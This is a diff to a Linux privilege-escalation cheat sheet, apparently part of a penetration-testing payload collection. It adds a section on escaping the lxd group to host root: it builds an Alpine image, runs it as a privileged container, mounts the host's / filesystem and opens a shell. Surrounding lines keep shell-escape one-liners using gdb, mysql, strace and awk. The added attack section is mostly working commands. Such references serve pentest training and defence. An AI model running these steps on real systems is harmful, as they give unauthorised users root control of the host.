@@ -29,6 +29,7 @@
 * [Wildcard](#wildcard)
 * [Groups](#groups)
     * [Docker](#docker)
+    * [LXC/LXD](#lxc-lxd)
 
 ## Checklists
 
@@ -157,7 +158,7 @@ sudo chmod +s /tmp/suid # setuid bit
 ### List capabilities of binaries 
 
 ```bash
-╭─swissky@crashmanjaro ~  
+╭─swissky@lab ~  
 ╰─$ /usr/bin/getcap -r  /usr/bin
 /usr/bin/fping                = cap_net_raw+ep
 /usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
@@ -253,7 +254,7 @@ The project collects legitimate functions of Unix binaries that can be abused to
 
 > gdb -nx -ex '!sh' -ex quit    
 > sudo mysql -e '\! /bin/sh'    
-> strace -o /dev/null /bin/sh 
+> strace -o /dev/null /bin/sh    
 > sudo awk 'BEGIN {system("/bin/sh")}'
 
 
@@ -325,6 +326,36 @@ sh-5.0# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+### LXC/LXD
+
+The privesc requires to run a container with elevated privileges and mount the host filesystem inside.
+
+```powershell
+╭─swissky@lab ~  
+╰─$ id
+uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)
+```
+
+Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
+
+```powershell
+# build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+./build-alpine -a i686
+
+# import the image
+lxc image import ./alpine.tar.gz --alias myimage
+
+# run the image
+lxc init myimage mycontainer -c security.privileged=true
+
+# mount the /root into the image
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+
+# interact with the container
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+```
 
 
 ## References
@@ -336,3 +367,4 @@ uid=0(root) gid=0(root) groups=0(root)
 - [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
 - [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
 - [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
+- [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
